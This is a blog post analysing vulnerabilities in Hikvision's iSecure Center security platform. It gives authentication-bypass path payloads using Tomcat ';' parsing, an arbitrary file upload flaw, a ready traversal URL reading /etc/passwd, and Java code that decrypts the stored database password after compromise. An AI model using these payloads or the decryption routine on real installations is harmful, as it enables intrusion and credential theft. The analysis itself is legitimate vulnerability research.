title: 海康威视综合安防 iSecure Center 漏洞分析
author: bmth
tags:
  - 海康威视
categories:
  - 代码审计
top_img: https://img-blog.csdnimg.cn/5c8b13f99cf143b180babc3a58b4bd8b.png
cover: https://img-blog.csdnimg.cn/5c8b13f99cf143b180babc3a58b4bd8b.png
date: 2023-07-31 12:39:00
---
![](https://img-blog.csdnimg.cn/5c8b13f99cf143b180babc3a58b4bd8b.png)

前些日子这个洞刚出的时候几乎通杀，有幸拿到了源码，就来分析一下

## 代码审计
### 权限绕过
首先是一个权限绕过问题，看到配置文件 cas-client.properties
![](https://img-blog.csdnimg.cn/88cb335426fa417da976f27a35cfb8fb.png)

发现`cas.ignore.pattern`，很明显存放的就是绕过权限的路径，全局查找一下
看到`bic-sso-client-1.6.9.4.RELEASE.jar!/com/hikvision/sso/client/config/util/CasClientConfig.class`
![](https://img-blog.csdnimg.cn/514d2116aa0e4f33bac0ef6cbeafb058.png)

全局查找调用`CasClientConfig.getCasClientConfig`方法的类，看到`bic-sso-client-1.6.9.4.RELEASE.jar!/org/jasig/cas/client/util/AbstractConfigurationFilter.class`的 getPropertyFromInitParams 方法
![](https://img-blog.csdnimg.cn/f1b5b1be769f45af979149885a7d0016.png)

那么就找下什么时候 propertyName 的值为 ignorePattern 
在`bic-sso-client-1.6.9.4.RELEASE.jar!/org/jasig/cas/client/authentication/AuthenticationFilter.class`
看名字就知道是身份认证的 Filter 
![](https://img-blog.csdnimg.cn/b334fc06db87450894e94aa513be3059.png)

在 initInternal 初始化的时候获取到`cas.ignore.pattern`的值 ，然后存储到 ignoreUrlPatternMatcherStrategyClass 中

看到它的 doFilter 方法，如果`this.isRequestUrlExcluded(request)`为true，直接绕过鉴权
![](https://img-blog.csdnimg.cn/cbeef6b5f5e043e2bbc006fc7f7fbc01.png)

跟进 isRequestUrlExcluded 方法
![](https://img-blog.csdnimg.cn/9d1595c680e4407f93f96f6517de0db0.png)

发现使用的是 getRequestUrl 方法获取的url路径，然后 matches 方法进行匹配
而这个方法与 Tomcat 的解析刚好会存在安全问题：
[Tomcat URL解析差异性导致的安全问题](https://xz.aliyun.com/t/7544)
[tomcat容器url解析特性研究](https://xz.aliyun.com/t/10799)

>Tomcat中的URL解析是支持嵌入`./`、`../`、`;`等特殊字符的
>此外，getRequestURL() 和 getRequestURI() 这两个函数解析提取的URL内容是包含我们嵌入的特殊字符的，当使用不当时会存在安全问题如绕过认证

跟进发现是使用正则表达式进行匹配的
![](https://img-blog.csdnimg.cn/5e084a829a3047d291d7f93751836e45.png)

如果满足正则匹配，就会绕过权限认证，最终得到如下payload
```
;.js
;.svg
;.ttf
/center/api/fileUpload/..;/
/center/api/task/..;/
```
等等方法都是可以用的，随便列举一个
![](https://img-blog.csdnimg.cn/b28e4c98e7a04b2d860a542a2a93c15c.png)

### 任意文件上传
没有了权限限制，就有很多操作点了，先来看到爆出的任意文件上传漏洞
`center/WEB-INF/classes/com/hikvision/center/module/faq/controller/KnowledgeController.class`
![](https://img-blog.csdnimg.cn/4ac88db272ae438dae98724b8078134a.png)

调用 uploadFile 方法上传文件，并返回结果
`center/WEB-INF/classes/com/hikvision/center/module/faq/service/impl/KnowledgeServiceImpl.class`
![](https://img-blog.csdnimg.cn/c5ba679b369d471ab8a0230231688fce.png)

可以看到直接使用 transferTo 方法上传文件，没有任何限制，并且对文件名进行了拼接，导致可以跨目录传文件
![](https://img-blog.csdnimg.cn/bbd832f6f0d3476fab1e0bf3e44297c8.png)

我们将文件放在 clusterMgr 目录下，就可以成功访问了
![](https://img-blog.csdnimg.cn/0379c1732cc840239adeee443502fa25.png)


### 任意文件读取
看到`center/WEB-INF/classes/com/hikvision/center/module/personmanage/controller/OrganizationController.class`
![](https://img-blog.csdnimg.cn/515164e8d66f47bb9337fe57dabc7e2b.png)

这里获取GET传参fileName
![](https://img-blog.csdnimg.cn/ec30fd413397438fbef176bfab30b04b.png)

然后直接进行的拼接，导致可以跨越目录读文件
```
/center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd
```
![](https://img-blog.csdnimg.cn/609c49ffb4e6440a9bf980d3faa8f733.png)


## 后渗透利用
一般拿到shell了，就需要更进一步的利用
### 数据库密码解密
看到`center/WEB-INF/classes/com/hikvision/center/config/jpa/GeeQueryConfig.class`
![](https://img-blog.csdnimg.cn/67d68fcb3d4742498ebd8a4f15124c0e.png)

发现是使用的postgresql数据库，并且看到数据库密码是先base64解密，然后使用`Authentication.transDataDecrypt`解密的
这里`opsmgr.database.password`在`config.properties`配置文件中
![](https://img-blog.csdnimg.cn/4059e8d8bdfb4070a2948029b97de3bf.png)

跟进`bic-iii-1.1.9.jar!/com/hikvision/hik/crypt/Authentication.class`
```java
public static byte[] transDataDecrypt(byte[] SData) throws CryptErrorException {
    return IIIAESUtils.transDataDecrypt(SData);
}
```
那么就看到`bic-iii-1.1.9.jar!/com/hikvision/hik/crypt/IIIAESUtils.class`
![](https://img-blog.csdnimg.cn/38c1292f38ed46cd950d69ab38bed688.png)

解密核心是使用的`System.load`加载配置文件 Identify.dll 或者 libIdentify.so ，然后使用内部的方法进行解密
那么解密就很简单了，加载 .jar 依赖，然后调用方法即可
```java
import com.hikvision.hik.crypt.Authentication;
import sun.misc.BASE64Decoder;

public class Main {
    public static String transDataDecrypt(String data) {
        try {
            BASE64Decoder decoder = new BASE64Decoder();
            return new String(Authentication.transDataDecrypt((decoder.decodeBuffer(data))), "UTF-8");
        } catch (Exception var2) {
            var2.printStackTrace();
            return null;
        }
    }

    public static void main(String[] args) {
        String password = transDataDecrypt("EQAQAHaQSvAuuQmMvRUpfoWt4scoTMSSkftYgn9qXVDvr28p6c0wP3LXDMFTZgJEWJS+Ug==");
        System.out.println(password);
    }
}
```
最后使用天蝎连接数据库，驱动：`org.postgresql.Driver`
![](https://img-blog.csdnimg.cn/d9e0e117b3ed451c965ab2b30502ddb0.png)

参考工具：[https://github.com/wafinfo/Hikvision](https://github.com/wafinfo/Hikvision)